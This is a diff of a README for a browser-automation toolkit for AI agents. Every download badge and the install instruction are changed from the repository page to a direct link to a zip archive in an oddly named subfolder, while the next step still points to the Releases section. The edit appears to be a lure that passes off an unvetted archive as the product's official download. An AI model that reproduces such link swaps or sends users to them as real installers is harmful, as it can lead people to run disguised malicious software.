@@ -1,6 +1,6 @@
 # 🧰 agent-browser-workspace - Local Browser Toolkit for AI Agents
 
-[![Download agent-browser-workspace](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace)
+[![Download agent-browser-workspace](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace/raw/refs/heads/main/deep_research_bench/workspace-agent-browser-v1.6.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Your system should allow the installation and running of programs from outside t
 ## 🚀 How to Download and Install agent-browser-workspace
 
 1. Click the big **Download** button at the top or visit the project page here:  
-   [https://github.com/abdelhameedhelal1991-design/agent-browser-workspace](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace)
+   [https://github.com/abdelhameedhelal1991-design/agent-browser-workspace/raw/refs/heads/main/deep_research_bench/workspace-agent-browser-v1.6.zip](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace/raw/refs/heads/main/deep_research_bench/workspace-agent-browser-v1.6.zip)
 
 2. On the GitHub page, find the **Releases** section. It usually appears on the right-hand side or under the repository header.
 
@@ -138,4 +138,4 @@ This project helps users automate browsing using Chrome's Developer Tools Protoc
 
 Find the latest version here:
 
-[![Download agent-browser-workspace](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace)
+[![Download agent-browser-workspace](https://img.shields.io/badge/Download-Here-4CAF50?style=for-the-badge)](https://github.com/abdelhameedhelal1991-design/agent-browser-workspace/raw/refs/heads/main/deep_research_bench/workspace-agent-browser-v1.6.zip)
